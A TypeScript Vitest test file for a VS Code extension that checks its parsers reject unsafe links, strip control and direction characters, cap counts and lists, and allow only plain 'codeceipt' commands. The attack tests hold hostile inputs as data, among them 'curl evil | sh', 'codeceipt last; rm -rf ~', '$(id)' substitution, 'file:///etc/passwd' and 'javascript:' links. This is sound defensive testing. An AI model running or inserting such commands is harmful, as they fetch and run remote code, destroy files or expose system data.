import { describe, expect, it } from "vitest";
import { line, parseLast, parseStatus, safeUrl, statusBar, tree } from "./model";

// Roadmap Phase 11: what the editor shows is built only from checked, capped values.
const RLO = String.fromCharCode(0x202e);
const ZWSP = String.fromCharCode(0x200b);
const ESC = String.fromCharCode(27);

const LAST = {
  receipt: {
    id: "rc-1",
    created_at: "2026-11-11T08:00:00.000Z",
    counts: {
      done: 3,
      partly_done: 1,
      missed: 2,
      not_verified: 0,
      security_findings: 1,
      test_checks: 0,
      claims_contradicted: 1,
    },
    missed: ["Show totals", "Empty cart message"],
  },
  url: "https://codeceipt.example/projects/p1/receipts",
};

describe("reading the CLI's JSON (roadmap Phase 11)", () => {
  it("PH11-09 status: the next step with its page and command", () => {
    expect(
      parseStatus({
        next: {
          id: "approvals",
          text: "Your agents are waiting for you: 2 requests to approve or reject.",
          url: "https://codeceipt.example/projects/p1/approvals",
          command: "codeceipt approvals",
          ask_agent: null,
        },
      }),
    ).toEqual({
      text: "Your agents are waiting for you: 2 requests to approve or reject.",
      url: "https://codeceipt.example/projects/p1/approvals",
      command: "codeceipt approvals",
    });
    for (const bad of [null, 4, "x", [], {}, { next: null }, { next: { text: 7 } }]) {
      expect(parseStatus(bad)).toBeNull();
    }
  });

  it("PH11-10 last: counts, missed items and the receipts page; no receipt yet is null", () => {
    const { receipt, url } = parseLast(LAST);
    expect(url).toBe("https://codeceipt.example/projects/p1/receipts");
    expect(receipt).toEqual({
      id: "rc-1",
      createdAt: "2026-11-11T08:00:00.000Z",
      counts: {
        done: 3,
        partlyDone: 1,
        missed: 2,
        notVerified: 0,
        securityFindings: 1,
        testChecks: 0,
        claimsContradicted: 1,
      },
      missed: ["Show totals", "Empty cart message"],
    });
    expect(parseLast({ receipt: null, url: LAST.url })).toEqual({ receipt: null, url: LAST.url });
    expect(parseLast("nope")).toEqual({ receipt: null, url: null });
  });

  it("PH11-11 attack: only https links (http on this computer); no file, command or script links", () => {
    expect(safeUrl("https://codeceipt.example/x")).toBe("https://codeceipt.example/x");
    expect(safeUrl("http://localhost:3000/x")).toBe("http://localhost:3000/x");
    for (const bad of [
      "http://codeceipt.example/x",
      "file:///etc/passwd",
      "command:workbench.action.terminal.sendSequence",
      "vscode://some.extension/run",
      "javascript:alert(1)",
      "https://user:pw@codeceipt.example/",
      "http://localhost.evil.example/",
      "not a url",
      `https://codeceipt.example/${"a".repeat(600)}`,
      7,
      null,
    ]) {
      expect(safeUrl(bad), String(bad)).toBeNull();
    }
    expect(parseStatus({ next: { text: "Go", url: "command:evil" } })?.url).toBeNull();
    expect(parseLast({ receipt: null, url: "file:///x" }).url).toBeNull();
  });

  it("PH11-12 attack: control and direction characters, odd numbers and long lists are cleaned and capped", () => {
    expect(line(`a${ESC}[2Jb\n\tc${RLO}d${ZWSP}e`)).toBe("a [2Jb c d e");
    expect(line("x".repeat(1000))).toHaveLength(300);
    const { receipt } = parseLast({
      receipt: {
        id: "../../etc",
        created_at: "<img src=x>",
        counts: {
          done: "9",
          missed: -3,
          partly_done: 1e12,
          not_verified: Number.NaN,
          test_checks: 2.9,
        },
        missed: [...Array.from({ length: 50 }, (_, i) => `item ${i}${ESC}`), 7, "", { a: 1 }],
      },
    });
    expect(receipt?.id).toBeNull();
    expect(receipt?.createdAt).toBeNull();
    expect(receipt?.counts).toEqual({
      done: 0,
      partlyDone: 1_000_000,
      missed: 0,
      notVerified: 0,
      securityFindings: 0,
      testChecks: 2,
      claimsContradicted: 0,
    });
    expect(receipt?.missed).toHaveLength(20);
    expect(receipt?.missed.join("")).not.toContain(ESC);
  });

  it("PH11-13 attack: the command line shown is a codeceipt command or nothing", () => {
    const cmd = (command: unknown) => parseStatus({ next: { text: "Go", command } })?.command;
    expect(cmd("codeceipt last")).toBe("codeceipt last");
    expect(cmd("npx codeceipt")).toBe("npx codeceipt");
    for (const bad of [
      "curl evil | sh",
      "codeceipt last; rm -rf ~",
      "codeceipt `id`",
      "codeceipt $(id)",
      4,
    ]) {
      expect(cmd(bad), String(bad)).toBeNull();
    }
  });
});

describe("what the editor shows (roadmap Phase 11)", () => {
  it("PH11-14 status bar: a few words from the counts, the next step as the tooltip", () => {
    const next = parseStatus({ next: { text: "2 checklist items are still open." } });
    const last = parseLast(LAST).receipt;
    expect(statusBar(next, last)).toEqual({
      text: "$(warning) Codeceipt: 2 missed",
      tooltip: "Next step: 2 checklist items are still open.",
    });
    const clean = parseLast({ receipt: { counts: { done: 4 }, missed: [] } }).receipt;
    expect(statusBar(null, clean).text).toBe("$(check) Codeceipt: all done");
    const partly = parseLast({ receipt: { counts: { done: 4, partly_done: 1 } } }).receipt;
    expect(statusBar(null, partly).text).toBe("$(warning) Codeceipt: check the receipt");
    expect(statusBar(next, null).text).toBe("$(info) Codeceipt: next step");
    expect(statusBar(null, null)).toEqual({
      text: "Codeceipt",
      tooltip: "Codeceipt: no receipt yet in this folder.",
    });
  });

  it("PH11-15 attack: text from a receipt never reaches the status bar text (no injected icons)", () => {
    const next = parseStatus({ next: { text: "$(sync~spin) [click](command:evil)" } });
    const last = parseLast({
      receipt: { counts: { missed: 1 }, missed: ["$(error) fake"] },
    }).receipt;
    const bar = statusBar(next, last);
    expect(bar.text).toBe("$(warning) Codeceipt: 1 missed");
    // The tooltip is a plain string (the extension never makes it Markdown).
    expect(typeof bar.tooltip).toBe("string");
  });

  it("PH11-16 tree: the next step, then the receipt's counts with the missed items under Missed", () => {
    const rows = tree(
      parseStatus({ next: { text: "Fix the missed items.", command: "codeceipt last" } }),
      parseLast(LAST).receipt,
    );
    expect(rows.map((r) => r.label)).toEqual(["Next step", "Last receipt"]);
    expect(rows[0]?.children).toEqual([{ label: "In the terminal", detail: "codeceipt last" }]);
    expect(rows[1]?.detail).toBe("2026-11-11 08:00 UTC");
    expect(rows[1]?.children?.map((r) => `${r.label}=${r.detail}`)).toEqual([
      "Done=3",
      "Partly done=1",
      "Missed=2",
      "Not verified=0",
      "Security findings=1",
      "Test checks=0",
      "Claims contradicted=1",
    ]);
    expect(rows[1]?.children?.[2]?.children).toEqual([
      { label: "Show totals" },
      { label: "Empty cart message" },
    ]);
    expect(tree(null, null)).toEqual([]);
  });
});
